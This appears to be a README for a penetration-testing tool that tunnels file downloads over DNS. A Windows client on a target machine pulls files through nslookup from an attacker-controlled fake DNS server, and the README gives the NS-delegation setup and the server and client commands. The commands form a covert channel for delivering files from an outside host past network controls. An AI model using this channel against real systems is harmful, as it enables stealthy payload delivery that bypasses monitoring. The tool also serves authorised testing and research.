# Tunneling
DNS tunneling to use during penetration testing

# DNS Download tunneling

## Description 

dns_download is a simple reverse dns download with a windows client and a POSIX compatible server. It allows you to download file using nslookup from your server to the windows client

The client runs on the target Windows machine and the server can run on any platform on the attacker machine.

## Usage

First, you have to delegate sub-names of your own domain name, so create NS-records for "subname.yourname.com" in the "yourname.com" zone

###Running the server

On the fake DNS server who's in charge of the delegation, just run

`python dns_download_serv.py`

###Running the client

If you can't specify a custom DNS to query, the maximum size by packet is 3000 (Probably because the size is filtered on the way)

So just run : 

`DNS_Download -Server <server> -Filename <filename>`

__`<server>` represents your NS subdomain who's delegated by your fake DNS Server__

Howeover,if you can specify a custom DNS, the maximum size is 45000 (Because given a string with length of n , the base64 length will be 4*(n/3) )

Then you can run : 

`DNS_Download -Server <server> -Filename <filename> -Size 45000 -DNS <dns>` 
